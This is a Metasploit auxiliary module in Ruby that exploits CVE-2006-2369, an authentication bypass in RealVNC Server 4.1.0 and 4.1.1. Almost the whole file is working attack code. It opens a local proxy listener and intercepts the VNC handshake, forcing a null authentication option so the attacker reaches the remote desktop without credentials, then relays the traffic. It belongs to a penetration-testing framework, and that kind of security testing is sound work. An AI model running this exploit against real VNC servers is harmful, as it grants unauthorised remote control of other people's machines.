##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'RealVNC NULL Authentication Mode Bypass',
        'Description' => %q{
          This module exploits an Authentication bypass vulnerability
          in RealVNC Server version 4.1.0 and 4.1.1. It sets up a proxy
          listener on LPORT and proxies to the target server.

          The AUTOVNC option requires that vncviewer be installed on
          the attacking machine.
        },
        'Author' => [
          'hdm', # original msf2 module
          'theLightCosine'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['BID', '17978'],
          ['OSVDB', '25479'],
          ['URL', 'https://web.archive.org/web/20080102163013/http://secunia.com/advisories/20107/'],
          ['CVE', '2006-2369'],
        ],
        'DisclosureDate' => '2006-05-15',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptPort.new('RPORT', [true, 'The port the target VNC Server is listening on', 5900 ]),
        OptPort.new('LPORT', [true, 'The port the local VNC Proxy should listen on', 5900 ]),
        OptBool.new('AUTOVNC', [true, 'Automatically launch vncviewer from this host', false])
      ]
    )
  end

  def run
    # starts up the Listener Server
    print_status('Starting listener...')
    listener = Rex::Socket::TcpServer.create(
      'LocalHost' => '0.0.0.0',
      'LocalPort' => datastore['LPORT'],
      'Context' => { 'Msf' => framework, 'MsfExploit' => self }
    )

    # If the autovnc option is set to true this will spawn a vncviewer on the local machine
    # targeting the proxy listener.
    if datastore['AUTOVNC']
      unless check_vncviewer
        print_error('The vncviewer does not appear to be installed, exiting...')
        return nil
      end
      print_status('Spawning viewer thread...')
      view = framework.threads.spawn('VncViewerWrapper', false) do
        system("vncviewer 127.0.0.1::#{datastore['LPORT']}")
      end
    end

    # Establishes the connection between the viewier and the remote server
    client = listener.accept
    add_socket(client)

    # Closes the listener socket as it is no longer needed
    listener.close

    s = connect

    serverhello = s.get_once
    unless serverhello.include? 'RFB 003.008'
      print_error('The server is not vulnerable')
      return
    end

    # MitM attack on the VNC Authentication Process
    client.puts(serverhello)
    clienthello = client.get_once
    s.puts(clienthello)

    s.read(2)

    print_status('Auth methods received. Sending null authentication option to client')
    client.write("\x01\x01")
    client.read(1)
    s.put("\x01")
    s.read(4)
    client.put("\x00\x00\x00\x00")

    # Handles remaining proxy operations between the two sockets
    closed = false
    while (closed == false)
      sockets = []
      sockets << client
      sockets << s
      selected = select(sockets, nil, nil, 0)
      # print_status ("Selected: #{selected.inspect}")
      next if selected.nil?

      if selected[0].include?(client)
        begin
          data = client.get_once
          if data.nil?
            print_error('Client closed connection')
            closed = true
          else
            s.put(data)
          end
        rescue StandardError
          print_error('Client closed connection')
          closed = true
        end
      end

      next unless selected[0].include?(s)

      begin
        data = s.get_once
        if data.nil?
          print_error('Server closed connection')
          closed = true
        else
          client.put(data)
        end
      rescue StandardError
        closed = true
      end
    end

    # Close sockets
    s.close
    client.close

    if datastore['AUTOVNC']
      begin
        view.kill
      rescue StandardError
        nil
      end
    end
  end

  def check_vncviewer
    vnc =
      Rex::FileUtils.find_full_path('vncviewer') ||
      Rex::FileUtils.find_full_path('vncviewer.exe')
    if vnc
      return true
    else
      return false
    end
  end
end
